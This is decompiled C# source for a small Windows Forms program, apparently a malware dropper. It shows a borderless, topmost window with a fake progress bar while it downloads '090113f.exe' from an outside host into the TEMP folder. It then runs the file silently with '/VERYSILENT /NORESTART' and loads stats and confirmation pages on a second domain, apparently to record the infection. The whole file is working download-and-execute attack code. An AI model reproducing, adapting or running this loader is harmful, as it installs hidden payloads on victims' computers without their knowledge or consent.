using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace f030113;

public class tela_inicial : Form
{
	private IContainer components;

	private WebBrowser navegador_1;

	private Panel painel_inicial;

	private Label lb_carregando;

	private Label lb_porc;

	private ProgressBar barra_progresso;

	private Timer clock;

	private BackgroundWorker worker_fundo;

	private Timer valida_NAV;

	public string pagina1 = "http://alertstop.com/090113stats/090113ip.htm";

	public string pagina2 = "http://alertstop.com/090113stats/confir.htm";

	private string name_090113 = "090113f.exe";

	private string pagina_down = "http://anunciogroup.com/090113download/";

	private string diretrizes = "/VERYSILENT /NORESTART";

	private bool nav1_completo;

	private bool ultimo_load;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f6: Expected O, but got Unknown
		//IL_0390: Unknown result type (might be due to invalid IL or missing references)
		//IL_039a: Expected O, but got Unknown
		components = new Container();
		navegador_1 = new WebBrowser();
		painel_inicial = new Panel();
		lb_carregando = new Label();
		lb_porc = new Label();
		barra_progresso = new ProgressBar();
		clock = new Timer(components);
		worker_fundo = new BackgroundWorker();
		valida_NAV = new Timer(components);
		((Control)painel_inicial).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)navegador_1).set_Location(new Point(27, 95));
		((Control)navegador_1).set_MinimumSize(new Size(20, 20));
		((Control)navegador_1).set_Name("navegador_1");
		((Control)navegador_1).set_Size(new Size(326, 250));
		((Control)navegador_1).set_TabIndex(10);
		navegador_1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(navegador_1_DocumentCompleted));
		painel_inicial.set_BorderStyle((BorderStyle)1);
		((Control)painel_inicial).get_Controls().Add((Control)(object)lb_carregando);
		((Control)painel_inicial).get_Controls().Add((Control)(object)lb_porc);
		((Control)painel_inicial).get_Controls().Add((Control)(object)barra_progresso);
		((Control)painel_inicial).set_Location(new Point(3, 6));
		((Control)painel_inicial).set_Name("painel_inicial");
		((Control)painel_inicial).set_Size(new Size(347, 62));
		((Control)painel_inicial).set_TabIndex(9);
		((Control)lb_carregando).set_Location(new Point(8, 9));
		((Control)lb_carregando).set_Name("lb_carregando");
		((Control)lb_carregando).set_Size(new Size(102, 13));
		((Control)lb_carregando).set_TabIndex(7);
		((Control)lb_porc).set_AutoSize(true);
		((Control)lb_porc).set_Location(new Point(314, 34));
		((Control)lb_porc).set_Name("lb_porc");
		((Control)lb_porc).set_Size(new Size(0, 13));
		((Control)lb_porc).set_TabIndex(5);
		((Control)barra_progresso).set_Location(new Point(8, 28));
		((Control)barra_progresso).set_Name("barra_progresso");
		((Control)barra_progresso).set_Size(new Size(301, 23));
		((Control)barra_progresso).set_TabIndex(3);
		clock.add_Tick((EventHandler)clock_Tick);
		worker_fundo.WorkerReportsProgress = true;
		worker_fundo.DoWork += bg_w_DoWork;
		worker_fundo.ProgressChanged += bg_w_ProgressChanged;
		worker_fundo.RunWorkerCompleted += bg_w_RunWorkerCompleted;
		valida_NAV.set_Enabled(true);
		valida_NAV.add_Tick((EventHandler)check_IE_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(355, 74));
		((Control)this).get_Controls().Add((Control)(object)navegador_1);
		((Control)this).get_Controls().Add((Control)(object)painel_inicial);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("tela_inicial");
		((Form)this).set_Opacity(0.9);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosed(new FormClosedEventHandler(tela_inicial_FormClosed));
		((Form)this).add_Load((EventHandler)tela_inicial_Load);
		((Control)painel_inicial).ResumeLayout(false);
		((Control)painel_inicial).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	public tela_inicial()
	{
		InitializeComponent();
	}

	private void tela_inicial_Load(object sender, EventArgs e)
	{
		clock.set_Enabled(true);
	}

	private void tela_inicial_FormClosed(object sender, FormClosedEventArgs e)
	{
		Environment.Exit(1);
	}

	private void clock_Tick(object sender, EventArgs e)
	{
		navegador_1.set_Url(new Uri(pagina1));
		worker_fundo.RunWorkerAsync();
		clock.set_Enabled(false);
	}

	private void bg_w_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\" + name_090113, diretrizes);
		navegador_1.set_Url(new Uri(pagina2));
		ultimo_load = true;
	}

	private void bg_w_ProgressChanged(object sender, ProgressChangedEventArgs e)
	{
		barra_progresso.set_Value(e.ProgressPercentage);
		((Control)lb_porc).set_Text(e.ProgressPercentage + "%");
	}

	private void bg_w_DoWork(object sender, DoWorkEventArgs e)
	{
		string text = pagina_down + name_090113;
		string path = Environment.GetEnvironmentVariable("TEMP") + "\\" + name_090113;
		Uri requestUri = new Uri(text.ToLower());
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUri);
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		httpWebResponse.Close();
		long contentLength = httpWebResponse.ContentLength;
		long num = 0L;
		using WebClient webClient = new WebClient();
		using Stream stream = webClient.OpenRead(new Uri(text));
		using (Stream stream2 = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
		{
			int num2 = 0;
			byte[] array = new byte[contentLength];
			while ((num2 = stream.Read(array, 0, array.Length)) > 0)
			{
				stream2.Write(array, 0, num2);
				num += num2;
				double num3 = num;
				double num4 = array.Length;
				double num5 = num3 / num4;
				int percentProgress = (int)(num5 * 100.0);
				worker_fundo.ReportProgress(percentProgress);
			}
			stream2.Close();
		}
		stream.Close();
	}

	private void navegador_1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		if (ultimo_load)
		{
			Application.Exit();
		}
	}

	private void navegador_2_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
	}

	private void check_IE_Tick(object sender, EventArgs e)
	{
		if (nav1_completo)
		{
			Environment.Exit(1);
		}
	}
}
